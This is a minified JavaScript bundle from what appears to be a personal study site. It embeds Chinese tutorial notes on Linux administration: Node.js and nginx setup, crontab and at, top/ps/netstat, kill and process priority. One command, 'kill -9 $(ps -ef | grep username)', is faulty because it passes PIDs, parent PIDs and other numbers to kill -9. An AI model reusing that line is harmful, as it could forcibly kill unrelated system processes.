"),t("a",{attrs:{href:"https://developer.aliyun.com/mirror/",target:"_blank",rel:"noopener noreferrer"}},[n._v("https://developer.aliyun.com/mirror/")])]),t("div",[t("a",{attrs:{href:"https://gitee.com/Discuz/DiscuzX",target:"_blank",rel:"noopener noreferrer"}},[n._v(" LAMP --- DiscuzX 开源论坛系统")])]),t("div",[n._v("奇Q工具网 "),t("a",{attrs:{href:"https://qqe2.com/",target:"_blank",rel:"noopener noreferrer"}},[n._v("https://qqe2.com/")])]),t("pre",[n._v("      nodejs  环境安装 \n      cd /usr/local/src/\n\n      官网 找到 linux 包 https://nodejs.org/download/release\n       https://nodejs.org/download/release/v12.20.0/node-v12.20.0-linux-x64.tar.xz\n       \nLinux 上安装 Node.js\nwget https://nodejs.org/dist/v12.18.1/node-v12.18.1-linux-x64.tar.xz    // 下载\ntar xf node-v12.18.1-linux-x64.tar.xz                                   // 解压\ncd node-v12.18.1-linux-x64                                              // 进入解压目录\n解压文件的 bin 目录底下包含了 node、npm 等命令，我们可以修改linux系统的环境变量（profile）来设置直接运行命令：\n\n老规矩先备份，养成修改重要文件之前先备份的好习惯。\n\ncp /etc/profile /etc/profile.bak\n然后 vim /etc/profile，在最下面添加 export PATH=$PATH: 后面跟上 node 下 bin 目录的路径\n\nexport PATH=$PATH:/root/node-v12.18.1-linux-x64/bin\n立即生效\n\nsource /etc/profile\n[root@localhost ~]# node -v\nv12.18.1\nOK！安装成功！\n   \n使用 Linux 服务器集群管理面板 appnode 类似的 工具 可以快速 部署\nyum -y install epel-release\nyum -y install nginx\n         service  nginx  restart\n          systemctl restart nginx.service\n   \n    ")]),t("pre",[n._v("杀死某个用户的 所有进程  kill -9 $(ps -ef | grep username)    或者   killall -u username  \n\n")])])}],J={data:function(){return{}}},z=J,W=Object(c["a"])(z,F,U,!1,null,"29e575de",null),$=W.exports,G=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},V=[],Q=(t("caad"),t("ac1f"),t("2532"),t("1276"),'\x3c!--\n * @Date           : 2021-07-11 03:48:46\n * @FilePath       : /jinnian-space/src/pages/linux/md/linux-进程检测与控制.md\n * @Description    : \n--\x3e\n# Linux计划任务以及进程检测与控制，优先级\n\n# 一、Linux计划任务\n\n##  Linux中的计划任务\n\n基本语法：\n\n```powershell\n# crontab [选项]\n-l ：list，显示目前已经设置的计划任务\n-e ：使用vim编辑器编辑计划任务的文件\n```\n\n案例：显示当前账号下的计划任务\n\n```powershell\n# crontab -l\nno crontab for root => root账号下没有创建计划任务\n```\n\n案例：编写计划任务\n\n```powershell\n# crontab -e\n```\n\n##  计划任务的编辑\n\ncrontab -e进入计划任务编辑文件\n\n![image-20200323162534378](media/image-20200323162534378.png)\n\n打开计划任务编辑文件后，可以在此文件中编写我们自定义的计划任务：\n\n==计划任务的规则语法格式，以行为单位，一行则为一个计划==\n\n```powershell\n分  时  日  月  周  要执行的命令（要求必须使用命令的完整路径，可以使用which查看）\n\n取值范围（常识）：\n分：0~59\n时：0~23\n日：1~31\n月：1~12\n周：0~7，0 和 7 表示星期天\n\n四个符号：\n*：表示取值范围中的每一个数字\n-：做连续区间表达式的，要想表示1~7，则可以写成：1-7\n/：表示每多少个，例如：想每 10 分钟一次，则可以在分的位置写：*/10\n,：表示多个取值，比如想在 1 点，2 点 6 点执行，则可以在时的位置写：1,2,6\n```\n\n![image-20200323163957324](media/image-20200323163957324.png)\n\n##  几个小案例\n\n问题1：每月1、10、22 日的4:45 重启network 服务\n\n```powershell\n第一步：定制格式\n分  时  日      月   周 /usr/bin/systemctl restart network\n第二步：定制时间\n45  4  1,10,22  *   *  /usr/bin/systemctl restart network\n```\n\n问题2：每周六、周日的1:10 重启network 服务\n\n```powershell\n第一步：定制格式\n分 时 日 月 周 /usr/bin/systemctl restart network\n第二步：定制时间\n10 1  * *  6,7 /usr/bin/systemctl restart network\n```\n\n问题3：每天18:00 至23:00 之间每隔30 分钟重启network 服务\n\n```powershell\n第一步：定制格式\n分 时 日 月 周 /usr/bin/systemctl restart network\n第二步：定制时间\n*/30 18-23 * * * /usr/bin/systemctl restart network\n```\n\n问题4：每隔两天的上午8 点到11 点的第3 和第15 分钟执行一次重启\n\n```powershell\n第一步：定制格式\n分 时 日 月 周 /usr/sbin/reboot\n第二步：定制时间\n3,15  8-11 */2 * * /usr/sbin/reboot\n```\n\n案例：每1 分钟往 root 家目录中的 readme.txt 中输一个1，为了看到效果使用追加输出【输出使用echo 命令，语法：# echo 输出的内容】\n\n```powershell\n# crontab -e\n* * * * * /usr/bin/echo 1 >> /root/readme.txt\n```\n\n提示：为了看到计划任务的效果，你可以单独开一个选项卡，使用tail  -f  /root/readme.txt\n\n##  计划任务\n\n常见的一个操作：定时备份（定时把数据库中的数据导出到某个文件中）\n##  计划任务权限\n\n### ☆ 黑名单\n\ncrontab是任何用户都可以创建的计划任务，但是超级管理员可以通过配置来设置某些用户不允许设置计划任务 。\n\n提出问题：如果我们想限定某个用户（如itheima）使用计划任务，如何处理呢？\n\n答：可以使用计划任务的黑名单，黑名单文件路径 => ==/etc/cron.deny==文件\n\n案例：把普通账号itheima加入到cron.deny黑名单中，禁止其创建计划任务\n\n第一步：切换到超级管理员root\n\n```powershell\n# su - root\n```\n\n第二步：使用vim打开/etc/cron.deny文件\n\n```powershell\n# vim /etc/cron.deny\n```\n\n第三步：把你需要禁止的用户名单，加入此文件（如itheima）\n\n```powershell\nitheima\n```\n\n切换到itheima账号，测试是否可以使用crontab命令\n\n![image-20200324095412933](media/image-20200324095412933.png)\n\n### ☆ 白名单\n\n在Linux的计划任务中，除了拥有黑名单以外，还有白名单。作用：允许哪些用户使用计划任务。\n\n白名单文件的路径 => ==/etc/cron.allow==，但是要特别注意，此文件需要手工创建。\n\n> 注意：白名单优先级高于黑名单，如果一个用户同时存在两个名单文件中，则会被默认允许创建计划任务。\n\n##  查看计划任务的保存文件\n\n问题：计划任务文件具体保存在哪里呢？\n\n答：`/var/spool/cron/用户名称`，如果使用root用户编辑计划任务，则用户文件名为root\n\n```powershell\n# ll /var/spool/cron\ntotal 4\n-rw-------. 1 itheima itheima  0 Mar 24 09:50 itheima\n-rw-------. 1 root    root    40 Mar 24 10:21 root\n```\n\n##  计划任务的日志程序\n\n问题：在实际应用中，我们如何查看定时任务运行情况？\n\n答：通过计划任务日志，日志文件位于`/var/log/cron`\n\n案例：演示计划任务的日志程序\n\n第一步：使用root账号创建一个计划任务\n\n```powershell\n# su - root\n# crontab -e\n* * * * * echo 1 >> ~/readme.txt\n```\n\n第二步：使用tail -f命令监控/var/log/cron日志程序\n\n```powershell\n# tail -f /var/log/cron\n```\n\n##  扩展内容：at命令\n\n在Linux系统下，有两个命令可以实现计划任务：crontab与at（第三方需要额外安装）\n\ncrontab ：每天定时执行计划任务（最小单元分钟）\n\nat ：一次性定时执行任务\n\n### ☆ 安装at命令\n\nCentOS7自带，其他版本可能需要手工安装\n\n```powershell\n# yum install at -y\n```\n\n### ☆ 启动底层服务\n\n```powershell\n# systemctl start atd\n# systemctl enable atd\n```\n\n> atd = at + d = at命令 + daemon缩写\n\n### ☆ 案例演示\n\n案例1：三天后下午5点执行/bin/ls\n\n```powershell\n# at 5pm+3 days\nat>/bin/ls >/root/readme.txt\nat>按Ctrl+D\n```\n\n> am = 上午、pm = 下午、3 days = 3天\n\n案例2：明天17点，输出时间到指定的文件中\n\n```powershell\n# at 17:00 tomorrow\nat>date>/root/readme.txt\nat>按Ctrl+D\n```\n\n> tomorrow = 明天\n\n案例3：使用atq查看没有执行的计划任务\n\n```powershell\n# atq\n```\n\n> atq = at + q = at命令 + query查询\n\n案例4：删除指定的计划任务\n\n```powershell\n# atq\n# atrm 任务号\n```\n\n> atrm = at + rm = at命令 + remove移除\n\n# 二、Linux进程与程序\n\n## 1、了解一下进程与程序的关系\n\n​        **进程**是正在执行的一个程序或命令，每个进程都是一个运行的实体，并占用一定的系统资源。**程序**是人使用计算机语言编写的可以实现特定目标或解决特定问题的代码集合。\n\n​        简单来说，程序是人使用计算机语言编写的，可以实现一定功能，并且可以执行的代码集合。进程是正在执行中的程序。\n\n**举例**：谷歌浏览器是一个程序，当我们打开谷歌浏览器，就会在系统中看到一个浏览器的进程，当程序被执行时，程序的代码都会被加载入内存，操作系统给这个进程分配一个 ID，称为 **PID**（进程 ID）。我们打开多个谷歌浏览器，就有多个浏览器子进程，但是这些进程使用的程序，都是chrome\n\n> PID = Process ID = 进程编号\n\n![image-20200324113209223](media/image-20200324113209223.png)\n\n## 2、Linux下的进程管理工作\n\n进程查看，通过查看，判断健康状态\n\n进程终止\n\n进程优先级控制\n\n# 三、Linux下进程管理命令\n\n## 1、任务背景\n\n工作场景：\n\n​        小黑入职到一家公司，接到的第一项任务，就是监控生产服务器的性能，提到服务器性能，我们首先想到的就是CPU，内存和磁盘。\n\n## 2、使用top命令动态监测CPU信息\n\n基本语法：\n\n```powershell\n# top\n```\n\n![image-20200324114201114](media/image-20200324114201114.png)\n\n## 3、系统的整体情况\n\n### ☆ 第一行\n\n![image-20200324114427942](media/image-20200324114427942.png)\n\n| 内 容                         | 说 明                                                        |\n| ----------------------------- | ------------------------------------------------------------ |\n| 10:12:28                      | 系统当前时间                                                 |\n| up 13:05                      | 系统的运行时间.本机己经运行 13 小时 05 分钟                  |\n| 3 users                       | 当前登录了三个用户                                           |\n| load average: 0.00,0.01，0.05 | 系统在之前 1 分钟、5 分钟、15 分钟的平均负载。如果 CPU 是单核的，则这个数值超过 1 就是高负载：如果 CPU 是四核的，则这个数值超过 4 就是高负载 |\n\n### ☆ 第二行\n\n![image-20200324115718442](media/image-20200324115718442.png)\n\n| Tasks:   230 total | 系统中的进程总数                                 |\n| ------------------ | ------------------------------------------------ |\n| 1 running          | 正在运行的进程数                                 |\n| 229 sleeping       | 睡眠的进程数                                     |\n| 0 stopped          | 正在停止的进程数                                 |\n| 0 zombie           | 僵尸进程数。如果不是   0，则需要手工检查僵尸进程 |\n\n### ☆ 第三行\n\n![image-20200324142002240](media/image-20200324142002240.png)\n\n| 内 容           | 说 明                                                        |\n| --------------- | ------------------------------------------------------------ |\n| Cpu(s): 0.1 %us | 用户模式占用的   CPU 百分比                                  |\n| 0.1%sy          | 系统模式占用的   CPU 百分比                                  |\n| 0.0%ni          | 改变过优先级的用户进程占用的   CPU 百分比                    |\n| 99.7%id         | idle缩写，空闲   CPU 占用的 CPU 百分比                       |\n| 0.1%wa          | 等待输入/输出的进程占用的   CPU 百分比                       |\n| 0.0%hi          | 硬中断请求服务占用的   CPU 百分比                            |\n| 0.1%si          | 软中断请求服务占用的   CPU 百分比                            |\n| 0.0%st          | st（steal   time）意为虚拟时间百分比，就是当有虚拟机时，虚拟 CPU 等待实际 CPU 的时间百分比 |\n\n#### 问题：如果我的机器有4核CPU，我想查看每一核心分别的负载情况怎能办？\n\n答：交换快捷键 “1”\n\n![image-20200324142144911](media/image-20200324142144911.png)\n\n> CPU负载测试 =>  cat  /dev/urandom |md5sum\n\n### ☆ 第四行\n\n![image-20200324143340302](media/image-20200324143340302.png)\n\n| 内 容              | 说 明                                                        |\n| ------------------ | ------------------------------------------------------------ |\n| Mem: 1863252 total | 物理内存的总量，单位为KB                                     |\n| 829960 used        | 己经使用的物理内存数量                                       |\n| 68352 free         | 空闲的物理内存数量。我们使用的是虚拟机，共分配了 628MB内存，所以只有53MB的空闲内存 |\n| 96490 buff/cache   | 作为缓冲的内存数量                                           |\n\n>扩展：真正剩余内存 = free + buff/cache，真正使用内存 = used - buff/cache\n\n### ☆ 第五行\n\n![image-20200324144347040](media/image-20200324144347040.png)\n\n| 内 容               | 说 明                        |\n| ------------------- | ---------------------------- |\n| Swap: 2097148 total | 交换分区（虚拟内存）的总大小 |\n| 3336 used           | 已经使用的交换分区的大小     |\n| 2093812 free        | 空闲交换分区的大小           |\n| 622420 avail Mem    | 可用内存                     |\n\n 在Linux操作系统分区时，最少需要3个分区：\n\n① /boot分区 ： 系统分区\n\n② swap交换分区 ：一般情况下为内存的1~2倍，但是尽量不要超过2G\n\n③ /分区 ：根分区，所有文件都存放于此\n\n> swap分区：就是当计算机的内存不足时，系统会自动从硬盘中划出一块区域充当内存使用。\n\n​       我们通过 top 命令的整体信息部分，就可以判断服务器的健康状态。如果 1 分钟、5 分钟、15 分钟的平均负载高于CPU核数，说明系统压力较大。如果物理内存的空闲内存过小，则也证明系统压力较大。\n\n问题：根据以上信息，目前我们的系统压力如何？\n\n答：看CPU负载及内存的使用情况\n\n\n\n问题：如果我们发现CPU负载过大，接下来怎么办？\n\n答：如果1分钟、5分钟以及15分钟全部超过CPU的总核心数（必须引起警觉），这个时候就要查看底部的进程信息了。\n\n> 经验之谈：如果一个总核数=8核心的CPU，理论上平均负载达到16，也还可以坚持很长一段时间。\n\n## 4、系统的进程信息\n\n![image-20200324151820219](media/image-20200324151820219.png)\n\n| PID     | 进程的 ID。                                                  |\n| ------- | ------------------------------------------------------------ |\n| USER    | 该进程所属的用户。                                           |\n| PR      | 优先级，数值越小优先级越高。                                 |\n| NI      | NICE优先级，数值越小优先级越高，取值范围-20到19，默认都是0   |\n| VIRT    | 该进程使用的虚拟内存的大小，单位为 KB。                      |\n| RES     | 该进程使用的物理内存的大小，单位为 KB。                      |\n| SHR     | 共享内存大小，单位为 KB。计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR） |\n| S       | 进程状态。其中S 表示睡眠，R 表示运行                         |\n| %CPU    | 该进程占用 CPU 的百分比。                                    |\n| %MEM    | 该进程占用内存的百分比。                                     |\n| TIME+   | 该进程共占用的 CPU 时间。                                    |\n| COMMAND | 进程名                                                       |\n\n#### 问题：如果我们发现CPU负载过大，接下来怎么办？\n\n答：查看占用CPU最多的进程\n\n\n\n#### 问题：如何查看占用CPU最多的进程？\n\n答：交互操作快捷键P，P（大写）：，表示将结果按照CPU 使用率从高到低进行降序排列\n\n\n\n#### 问题：如果我们发现内存可用量很小，接下来怎么办？\n\n答：查看占用内存最多的进程，使用交互快捷键M（大写）：表示将结果按照内存（MEM）从高到低进行降序排列\n\n![image-20200324154216736](media/image-20200324154216736.png)\n\n\n\n#### 问题：当我们查看完系统状态，需要做什么？\n\n答：退出，使用q，按键盘上的q，就会回到#提示符的状态。\n\n## 5、free查看内存使用情况\n\n基本语法：\n\n```powershell\n# free [选项]  1GB = 1024MB  1MB = 1024KB\n选项说明：\n-m : 以MB的形式显示内存大小\n```\n\n案例：显示计算机的内存使用情况\n\n```powershell\n# free -m\n```\n\n​    和Centos6相比，buffer和cached被合成一组，加入了一个available。\n\n​    关于此available，即系统可用内存，用户不需要去计算buffer/cache，即可以看到还有多少内存可用，更加简单直观\n\n![image-20200324155922424](media/image-20200324155922424.png)\n\n## 6、df查看磁盘剩余空间\n\n基本语法：\n\n```powershell\n# df [选项]\n-h ：以较高的可读性显示磁盘剩余空间大小\n```\n\n> df = disk free = 磁盘 剩余\n\n这几列依次是：\n\n| Filesystem | 磁盘名称                           |\n| ---------- | ---------------------------------- |\n| Size       | 总大小                             |\n| Used       | 被使用的大小                       |\n| Avail      | 剩余大小                           |\n| Use%       | 使用百分比                         |\n| Mounted on | 挂载路径（相当于Windows 的磁盘符） |\n\n## 7、ps查看系统进程信息\n\ntop ： 动态查看系统进程的信息（每隔3s切换一次）\n\nps  ： 静态查看系统进程的信息（只能查询运行ps命令瞬间，系统的进程信息）\n\n基本语法：\n\n```powershell\n# ps [选项]\n选项说明：\n-e : 等价于“-A”，表示列出全部（all）的进程\n-f : 表示full，显示全部的列（显示全字段）\n```\n\n案例：显示当前系统中所有进程的信息\n\n```powershell\n# ps -ef\n```\n\n![image-20200324162137670](media/image-20200324162137670.png)\n\n| UID   | 该进程执行的用户ID                                           |\n| ----- | ------------------------------------------------------------ |\n| PID   | 进程ID                                                       |\n| PPID  | 该进程的父级进程ID，如果找不到，则该进程就被称之为僵尸进程（Parent Process ID） |\n| C     | Cpu的占用率，其形式是百分数                                  |\n| STIME | 进程的启动时间                                               |\n| TTY   | 终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起 |\n| TIME  | 进程实际使用CPU的时间                                        |\n| CMD   | 该进程的名称或者对应的路径                                   |\n\n> 经验之谈：我们在实际工作中使用ps命令其实主要用于查询某个进程的PID或PPID\n\n工作场景\n\n​        小黑用学到的命令，发现某个进程占用CPU很高，希望进一步查看这个简称的信息。\n\n​        ps -ef 会列出全部进程，但是我们发现进程非常多，我们很难找到自己想要看的进程。这里需要使用过滤命令grep，来过滤掉我们不需要的信息。\n\n基本语法：\n\n```powershell\n用法：ps -ef |grep 想要看到的进程名\n示例代码：\n# ps -ef |grep crond\n含义：查看crond进程的详细情况\n注意：查询结果中，如果只有一条则表示没查到对应的进程（这1 条表示刚才ps 指令的自身）。只有查到的结果多余1 条，才表示有对应的进程。\n```\n\n案例：查询crond的进程信息\n\n```powershell\n# ps -ef |grep crond\nroot       7102      1  0 Mar23 ?        00:00:04 /usr/sbin/crond -n\nroot      24752  12881  0 16:34 pts/2    00:00:00 grep --color=auto crond\n```\n\n问题：以上信息只有第一行是crond的进程，第二行，实际是管道命令发起时，grep所启动的进程，如何去掉？\n\n```powershell\n# ps -ef |grep crond |grep -v "grep"\nroot       7102      1  0 Mar23 ?        00:00:04 /usr/sbin/crond -n\n```\n\n> grep  -v  需要去除的相关信息 ： 去除包含指定关键词的那一行\n\n扩展：ps  aux命令\n\n```powershell\n# ps aux\n```\n\n> \\# man ps\n>\n> 1   UNIX options, which may be grouped and must be preceded by a dash.     ps  -ef\n> 2   BSD options, which may be grouped and must not be used with a dash.\t ps  aux\n\n![image-20200324165018806](media/image-20200324165018806.png)\n\nUSER：该 process 属于哪个使用者账号\n==PID ：该 process 的ID==\n==%CPU：该 process 使用掉的 CPU 资源百分比==\n==%MEM：该 process 所占用的物理内存百分比==\nVSZ ：该 process 使用掉的虚拟内存量 (Kbytes)\nRSS ：该 process 占用的固定的内存量 (Kbytes)\nTTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。\n==STAT：该程序目前的状态，主要的状态有==\n    R ：该程序目前正在运作，或者是可被运作\n    S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。\n    T ：该程序目前正在侦测或者是停止了\n   ==Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态==\nSTART：该 process 被触发启动的时间\nTIME ：该 process 实际使用 CPU 运作的时间\nCOMMAND：该程序的实际指令\n\n## 8、netstat/ss查询网络访问信息\n\n基本语法：\n\n```powershell\n# netstat [选项] |grep 进程名称\n选项说明：\n-t：表示只列出tcp 协议的连接（tcp协议与udp协议）\n-n：表示将地址从字母组合转化成ip 地址，将协议转化成端口号来显示  10.1.1.10:80\n-l：表示过滤出"state（状态）"列中其值为LISTEN（监听）的连接\n-p：表示显示发起连接的进程pid 和进程名称\n```\n\n案例：查询Web Server（httpd）服务的端口信息\n\n```powershell\n# netstat -tnlp |grep httpd\n```\n\n\n\n基本语法：\n\n```powershell\n# ss -naltp |grep 进程名称\n```\n\n案例：查询sshd服务的端口信息\n\n```powershell\n# ss -naltp |grep sshd\n```\n\n> netstat与ss区别？① netstat信息比较简洁，ss更加丰富 ② ss执行效率比netstat略高一些\n\n## 9、kill/killall杀死进程\n\n### ☆ 根据pid杀掉进程\n\n```powershell\n命令：kill\n语法：kill [信号] PID\n作用：kill 命令会向操作系统内核发送一个信号（多是终止信号）和目标进程的 PID，然后系统内核根据收到的信号类型，对指定进程进行相应的操作\n\n经验：kill经常结合ps命令一起使用\n```\n\n> kill命令用于杀死某个进程，这其实只是其一个功能。kill命令的实质是向进程发送信号\n\n信号种类：\n\n| 信号编号 | 含义                                     |\n| -------- | ---------------------------------------- |\n| 9        | 杀死进程，即强制结束进程。               |\n| 15       | 正常结束进程，是 kill   命令的默认信号。 |\n\n案例：使用kill命令杀死crond进程\n\n```powershell\n# ps -ef |grep crond\n7102\n# kill 7102\n```\n\n> 备注：在互联网中，经常看到kill  -9  进程PID，强制杀死某个进程，kill -9 pid\n\n### ☆ 根据进程名称杀掉进程\n\n基本语法：\n\n```powershell\n# killall [信号编号] 进程名称\n```\n\n案例：使用killall命令杀死crond进程\n\n```powershell\n# killall crond\n```\n\n案例：使用killall命令杀死httpd进程\n\n```powershell\n# killall httpd\n```\n\n\n# 三、进程的优先级（扩展）\n\n## 1、什么是进程的优先级\n\nLinux是一个多用户、多任务的操作系统，系统中通常运行着非常多的进程。哪些进程先运行，哪些进程后运行，就由进程优先级来控制\n\n思考：什么时候需要用到进程的优先级呢？\n\n答：当CPU负载过高时，如CPU的使用率>=90%以上。这个时候进程的优先级就会起作用。\n\n## 2、查看进程的优先级\n\nPR  优先级，数值越小优先级越高。\nNI  优先级，数值越小优先级越高，可以人为更改。（NI = NICE = Nice）\n\n讲个小故事：Nice值 = 0，Nice值越高，代表这个人越绅士（Nice值越高，优先级越低）\n\n> NI值有一个范围 -20 ~ 19\n\n问题：这两个数值是在哪里看到的？\n\n答：top命令\n\n## 3、调整进程的优先级\n\n### ☆ 使用top调整进程的优先级\n\n第一步：使用top命令获取你要调整的进程信息（PID编号）\n\n```powershell\n# top -bn 1\nPID   \tCOMMAND\n7107\tatd（at命令的底层服务）\n```\n\n第二步：运行top命令，然后按=="r"==，输入要调整进程的PID编号\n\n```powershell\n# top\n按r，输入要调整进程的PID编号,按回车\n```\n\n第三步：根据提示，重置NICE值\n\n```powershell\nRenice PID 7107 to value : -5\n```\n\n第四步：按q退出top模式，然后使用top -p PID编号，只查询某个进程的信息\n\n```powershell\n# top -p 7107\n```\n\n### ☆ 使用renice命令调整进程的优先级\n\n基本语法：\n\n```powershell\n# renice [NI优先级设置的数字] 想调整的进程ID\n```\n\n案例：使用renice调整atd的优先级\n\n```powershell\n第一步：通过ps或top命令获取atd的PID编号\n# ps -ef |grep atd\n7107\n第二步：使用renice命令调整7107的NICE值\n# renice -10 7107\n7107 (process ID) old priority 0, new priority -10\n```\n\n> 注意：NICE值取值范围-20 ~ 19，不能使用小数\n\n### ☆ 使用nice命令调整进程的优先级\n\n基本语法：\n\n```powershell\n# nice [NI优先级设置的数字] 想调整的进程名称\n```\n\n> 注意：nice命令只能调整没有运行的程序\n\nnice实际操作三步走：\n\n第一步：将程序停止\n\n```powershell\n# ps -ef |grep crond\n# kill PID\n或\n# systemctl stop crond\n```\n\n第二步：启动并制定优先级（使用nice）\n\n```powershell\n# nice -n -10 crond\n```\n\n> nice命令包含两个功能：① 启动进程 ② 调整进程的优先级\n\n第三步：确认优先级（查看优先级）\n\n```powershell\n# ps -ef |grep crond\nPID\n# top -p PID\n```\n\n\n\n\n\n\n'),K={data:function(){return{MainComponent:Q,img_prefix:"./img/linux/heima-Linux云计算/进程检测与控制/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},X=K,Y=Object(c["a"])(X,G,V,!1,null,"9241284e",null),Z=Y.exports,nn=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},rn=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("\n---查看端口占用\nnetstat -ap | grep 8000\n\n---重启nginx\nsudo /usr/sbin/nginx -c /usr/local/nginx/conf/nginx.conf\nsudo nginx -s reload\nSudo service nginx restart\nps -ef | grep nginx\n")])])}],tn={},en=tn,an=Object(c["a"])(en,nn,rn,!1,null,"4c124315",null),sn=an.exports,on=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},ln=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v(" "),t("code",[n._v("     \n一、查看日志和机器相关信息常用命令\n\n1、cat\ncat 命令连接文件并打印到标准输出设备上，cat经常用来显示文件的内容，类似于下的type命令\n注意：当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用more等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。\n\n2、tail \n\ntail命令  用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。\n\n常用参数：\n\n-f<name/descriptor>或；--follow<nameldescript>：显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。“-f”与“-fdescriptor”等效；\n-n<N>或——line=<N>：输出文件的尾部N（N位数字）行内容。\n-s<秒数>或——sleep-interal=<秒数>：与“-f”选项连用，指定监视文件变化时间隔的秒数；　　\n\n\n二、实际操作须知\n\n1、日志文件说明\n\n/var/log/message     //系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一\n/var/log/secure      //与安全相关的日志信息\n/var/log/maillog    //与邮件相关的日志信息\n/var/log/cron       //与定时任务相关的日志信息\n/var/log/spooler    //与UUCP和news设备相关的日志信息\n/var/log/boot.log   //守护进程启动和停止相关的日志消息\n2、查看系统信息\n\n# uname -a                # 查看内核/操作系统/CPU信息\n# cat /etc/issue\n# cat /etc/redhat-release # 查看操作系统版本\n# cat /proc/cpuinfo       # 查看CPU信息\n# hostname                # 查看计算机名\n# lspci -tv               # 列出所有PCI设备\n# lsusb -tv               # 列出所有USB设备\n# lsmod                   # 列出加载的内核模块\n# env                     # 查看环境变量\n3、查看系统运行资源　　\n\n# free -m                     # 查看内存使用量和交换区使用量\n# df -h                       # 查看各分区使用情况\n# du -sh <目录名>             # 查看指定目录的大小\n# grep MemTotal /proc/meminfo # 查看内存总量\n# grep MemFree /proc/meminfo  # 查看空闲内存量\n# uptime                      # 查看系统运行时间、用户数、负载\n# cat /proc/loadavg           # 查看系统负载\n4、查看系统磁盘和分区信息\n\n# mount | column -t  # 查看挂接的分区状态\n# fdisk -l                  # 查看所有分区\n# swapon -s             # 查看所有交换分区\n# hdparm -i /dev/hda  # 查看磁盘参数(仅适用于IDE设备)\n# dmesg | grep IDE  # 查看启动时IDE设备检测状况\n5、查看网络信息　　\n\n# ifconfig        # 查看所有网络接口的属性\n# iptables -L     # 查看防火墙设置\n# route -n        # 查看路由表\n# netstat -lntp   # 查看所有监听端口\n# netstat -antp   # 查看所有已经建立的连接\n# netstat -s      # 查看网络统计信息\n6、查看进程　　\n\n# ps -ef   # 查看所有进程\n# top      # 实时显示进程状态\n7、查看用户信息\n\n# w                       # 查看活动用户\n# id <用户名>             # 查看指定用户信息\n# last                    # 查看用户登录日志\n# cut -d: -f1 /etc/passwd # 查看系统所有用户\n# cut -d: -f1 /etc/group  # 查看系统所有组\n# crontab -l              # 查看当前用户的计划任务\n8、查看服务\n\n# chkconfig –list           # 列出所有系统服务\n# chkconfig –list | grep on # 列出所有启动的系统服务\n9、查看系统安装程序　　\n\n# rpm -qa   # 查看所有安装的软件包　　\n\n\n ")]),n._v("\n")])])}],cn={},pn=cn,un=Object(c["a"])(pn,on,ln,!1,null,"1e61cfb9",null),mn=un.exports,dn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div")},gn=[],bn={},vn=bn,hn=Object(c["a"])(vn,dn,gn,!1,null,"f7c8c224",null),Sn=hn.exports,yn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)])},fn=[],_n="\r\n\r\n\r\n\r\n\x3c!--\r\n\r\n * @Date           : 2021-07-07 02:42:15\r\n * @FilePath       : /jinnian-space/src/pages/linux/md/linux-目录.md\r\n * @Description    : \r\n--\x3e\r\n\r\n\r\n| centos6 运行级别： | 作用                                  |\r\n| ---------- | ------------------------------------- |\r\n| 0          | 表示关机                              |\r\n| 1          | 单用户模式，就是Windows中的“安全模式” |\r\n| 2          | 断网状态下的多用户模式                |\r\n| 3          | 纯命令行模式（强烈推荐使用此模式）    |\r\n| 4          | 还没想好做什么用的模式（保留模式）    |\r\n| 5          | 图形用户界面（X-Window）              |\r\n| 6          | 表示重启（一开机就会重启）            |\r\n\r\n|          | LINUX有四种基本文件系统类型                                  |\r\n| -------- | ------------------------------------------------------------ |\r\n| 普通文件 | 如文本文件、C语言元代码、SHELL脚本、二进制的可执行文件等，可用cat、less、more、vi、emacs来察看内容，用mv来改名。 |\r\n| 目录文件 | 包括文件名、子目录名及其指针。它是LINUX储存文件名的唯一地方，可用ls列出目录文件。 |\r\n| 连接文   | 是指向同一索引节点的那些目录条目。用ls来查看是，连接文件的标志用l开头，而文件面后以”->”指向所连接的文件。 |\r\n| 特殊文件 | LINUX的一些设备如磁盘、终端、打印机等都在文件系统中表示出来，则一类文件就是特殊文件，常放在/dev目录内。例如，软驱A称为/dev/fd0。LINUX无C：的概念，而是用/dev/had来自第一硬盘。 |\r\n\r\n\r\n\r\n| 目录       |                      | 作用                                                         |\r\n| ---------- | -------------------- | ------------------------------------------------------------ |\r\n| bin        | user        binaries | 二进制文件的目录（就是可执行程序的目录） 